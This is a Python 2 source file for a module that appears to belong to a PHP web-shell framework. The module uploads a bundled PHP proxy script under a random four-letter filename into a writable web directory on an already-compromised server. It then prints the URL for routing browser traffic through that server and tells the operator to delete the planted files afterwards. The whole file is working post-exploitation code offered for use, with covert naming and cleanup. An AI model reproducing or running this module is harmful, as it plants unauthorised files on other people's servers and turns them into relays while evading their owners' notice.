from string import ascii_lowercase
from modules.file.upload2web import Upload2web
from modules.file.upload import WARN_NO_SUCH_FILE
from core.moduleexception import ModuleException, ProbeException
from core.vector import VectorList, Vector
from core.savedargparse import SavedArgumentParser as ArgumentParser
from argparse import SUPPRESS
import re, os
from random import choice

class Phpproxy(Upload2web):
    '''Upload binary/ascii file to the web root, getting the corresponding url'''


    argparser = ArgumentParser(usage=__doc__)
    argparser.add_argument('rpath', help='Optional, upload as rpath', nargs='?')
    
    argparser.add_argument('-startpath', help='Upload in first writable subdirectory', metavar='STARTPATH', default='.')
    argparser.add_argument('-chunksize', type=int, default=1024)
    argparser.add_argument('-vector', choices = Upload2web.vectors.get_names(), help=SUPPRESS)
    argparser.add_argument('-force', action='store_true')

    def _prepare_probe(self):

        try:
            content = open(os.path.join(self.modhandler.path_modules, 'net', 'external', 'phpproxy.php'), 'r').read()
        except Exception, e:
            raise ProbeException(self.name,  '\'%s\' %s' % (self.args['lpath'], WARN_NO_SUCH_FILE))

        self.args['lpath'] = ''.join(choice(ascii_lowercase) for x in range(4)) + '.php'
        self.args['content'] = content
    
        Upload2web._prepare_probe(self)
    
    
    def _output_result(self):

        Upload2web._output_result(self)

        sess_filename = os.path.join(*(self.args['rpath'].split('/')[:-1] + [ 'sess_*']))
        
        self._output = """Php proxy installed, point your browser to %s?u=http://www.google.com .
Delete '%s' and '%s' at session end.""" % ( self.args['url'], self.args['rpath'], sess_filename )

        
        
            
        